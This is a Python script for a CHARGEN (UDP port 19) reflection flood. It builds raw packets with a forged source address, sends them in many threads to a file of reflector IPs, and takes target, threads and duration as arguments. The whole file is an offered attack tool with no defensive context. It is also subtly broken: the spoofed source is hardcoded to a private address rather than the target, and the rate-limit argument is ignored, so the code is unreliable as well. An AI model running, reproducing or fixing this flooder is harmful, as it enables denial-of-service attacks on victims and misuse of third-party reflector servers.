import socket
import threading
import time
import random
from struct import pack, unpack
import os 

# Constants
MAX_PACKET_SIZE = 8192
PHI = 0x9e3779b9

# Global variables
Q = [0] * 4096
c = 362436
pps = 0
limiter = 0
sleeptime = 100

def init_rand(x):
    Q[0] = x
    Q[1] = x + PHI
    Q[2] = x + PHI + PHI
    for i in range(3, 4096):
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i

def rand_cmwc():
    global c
    a = 18782
    r = 0xfffffffe
    i = 4095
    i = (i + 1) & 4095
    t = a * Q[i] + c
    c = (t >> 32)
    x = t + c
    if x < c:
        x += 1
        c += 1
    Q[i] = r - x
    return Q[i]

def csum(buf):
    if len(buf) % 2 == 1:
        buf += b'\x00'
    s = 0
    for i in range(0, len(buf), 2):
        s += (buf[i] << 8) + buf[i+1]
    s = (s >> 16) + (s & 0xffff)
    s += (s >> 16)
    return ~s & 0xffff


class IPAddress:
    def __init__(self, ip):
        self.ip = ip
        self.next = None
        self.prev = None

def flood(target, ips):
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    packet = b''
    ip_header = b''
    udp_header = b''
    data = b''
    global pps

    while True:
        for ip in ips:
            # IP Header
            ip_header = pack('!BBHHHBBH4s4s', 69, 0, 28, 54321, 0, 255, 17, 0, socket.inet_aton("192.168.3.100"), socket.inet_aton(ip.ip))
            # UDP Header
            udp_header = pack('!HHHH', random.randint(1026, 65535), 19, 8, 0)  # Specify the Chargen port
            # Checksum
            pseudo_header = pack('!4s4sBBH', socket.inet_aton("192.168.3.100"), socket.inet_aton(ip.ip), 0, 17, 17)
            checksum = csum(pseudo_header + udp_header + data)
            udp_header = pack('!HHHH', random.randint(1026, 65535), 19, 8, checksum)
            packet = ip_header + udp_header + data
            s.sendto(packet, (ip.ip, 19))  # Specify the Chargen port
            pps += 1
            if pps >= limiter:
                time.sleep(sleeptime / 1000)
                
def read_ips(filename):
    ips = []
    with open(filename, 'r') as f:
        for line in f:
            line = line.strip()
            if line:
                ips.append(IPAddress(line))
    return ips

def main(target_ip, target_port, reflection_file, threads, pps_limiter, duration):
    ips = read_ips(reflection_file)
    target = (target_ip, target_port)
    for _ in range(threads):
        t = threading.Thread(target=flood, args=(target, ips))
        t.start()
    time.sleep(duration)
    print("Flood finished.")
    os._exit(0)  # Exit the program

if __name__ == '__main__':
    import sys
    if len(sys.argv) != 7:
        print("Usage: python script.py <target IP> <target port> <reflection file> <threads> <pps limiter, -1 for no limit> <duration in seconds>")
        sys.exit(1)
    main(sys.argv[1], int(sys.argv[2]), sys.argv[3], int(sys.argv[4]), int(sys.argv[5]), int(sys.argv[6]))
